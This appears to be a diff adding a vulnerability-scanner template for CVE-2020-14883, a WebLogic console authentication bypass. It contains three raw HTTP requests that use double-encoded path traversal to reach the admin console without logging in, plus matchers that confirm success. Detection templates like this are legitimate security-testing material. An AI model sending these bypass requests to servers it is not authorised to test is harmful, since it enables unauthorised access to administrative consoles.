@@ -1,0 +1,62 @@
+id: CVE-2020-14883
+info:
+  name: WebLogic Privilege Escalation Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    WebLogic has a privilege escalation vulnerability, which allows attackers to take over the WebLogic Server Console without authorization or control server permissions, bypassing authentication.
+  reference:
+    - https://www.oracle.com/middleware/technologies/weblogic.html
+  classification:
+    cve-id:
+      - CVE-2020-14883
+    cvss-score: 9.8
+
+http:
+  - raw:
+      - |
+        GET /console/css/%252E%252E/console.portal?_nfpb=true&_pageLabel=HomePage1&handle=java.lang.String("ahihi") HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "console.pageHelpURL"
+          - "console.recordState"
+
+  - raw:
+      - |
+        GET /console/images/%252E./console.portal?_nfpb=true&_pageLabel=HomePage1&handle=java.lang.String("ahihi") HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "console.pageHelpURL"
+          - "console.recordState"
+
+  - raw:
+      - |
+        GET /console/images/%25%32%65%25%32%65%25%32%66console.portal?_nfpb=true&_pageLabel=HomePage1&handle=java.lang.String("ahihi") HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "console.pageHelpURL"
+          - "console.recordState"
